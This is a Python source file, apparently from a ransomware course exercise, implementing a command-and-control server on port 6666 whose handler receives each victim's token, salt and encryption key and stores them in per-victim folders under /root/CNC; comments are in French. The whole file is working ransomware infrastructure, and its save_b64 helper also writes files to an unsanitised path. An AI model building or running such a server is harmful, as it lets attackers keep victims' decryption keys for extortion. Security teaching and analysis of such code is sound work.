import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import json
import hashlib

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path: str, params: dict, body: dict) -> dict: #On extrait extrait le jeton, le sel et la clé 
        token = body.get("token")
        salt = body.get("salt")
        key = body.get("key")

        # Repertoire pour le hachage du token
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        directory_path = os.path.join("/root/CNC", token_hash)

        os.makedirs(directory_path, exist_ok=True)  #répertoire basé sur le hachage SHA-256 du jeton

        # Clé et sel stockees dans des fichiers en binaire
        with open(os.path.join(directory_path, "salt.bin"), "wb") as salt_file:
            salt_file.write(base64.b64decode(salt))  # Décoder le sel

        with open(os.path.join(directory_path, "key.bin"), "wb") as key_file:
            key_file.write(base64.b64decode(key))  # Décoder la clé

        return {} 

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()